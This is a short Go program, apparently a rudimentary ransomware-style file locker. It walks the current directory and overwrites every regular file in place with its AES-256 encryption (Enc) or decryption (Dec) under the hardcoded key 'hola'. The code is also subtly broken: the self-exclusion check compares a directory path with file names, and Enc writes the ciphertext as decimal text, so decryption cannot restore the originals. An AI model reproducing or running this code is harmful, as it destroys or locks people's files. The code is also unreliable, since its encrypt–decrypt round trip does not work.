package main

import (
  "strings"
  "fmt"
  "log"
  "io/ioutil"
  "os"
  "path/filepath"
  "github.com/mkmueller/aes256"
)

func main(){
 Dec("hola") 
  
}


func GetFileEx() (dir string)  {
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}

	exPath := filepath.Dir(ex)
	Env := os.Getenv("TEMP")
	end := strings.HasPrefix(ex, Env)

	if end {
		temp, err := os.Getwd()
		if err != nil {
			panic(err)
		}
		dir = temp
	} else {
		dir = exPath
	}

	return 
} 

func GetFiles()  (List [] string) {
	Ex := GetFileEx() 
	files, err := ioutil.ReadDir(".")
    if err != nil {
        log.Fatal(err)
    }
 
    for _, f := range files {
            if f.Name() == Ex {
            	continue
            } else if f.IsDir() {
	  	 continue
	 }
            List = append(List,  f.Name()) 
    }
	
    return
} 

func Enc(Key string) {
	
	for _,  File := range GetFiles()  {
   content, _ := ioutil.ReadFile(File)

  f, err := os.OpenFile(File, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
  if err != nil {
    log.Fatal(err)
  }
  Out,  _ := aes256.Encrypt(Key, content)  
  fmt.Fprintf(f, "%d",  Out)
  err = f.Close()
  if err != nil {
      log.Fatal(err) 
  }  
  
 } 
}

func Dec(Key string) { 	
	for _,  File := range GetFiles()  {
   content, _ := ioutil.ReadFile(File)
  f, err := os.OpenFile(File, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
  if err != nil {
    log.Fatal(err)
  }
  Out,  _ := aes256.Decrypt(Key, content)  
  fmt.Fprintf(f, "%v",  Out)
  err = f.Close()
  if err != nil {
      log.Fatal(err) 
  }  
  
 } 
}



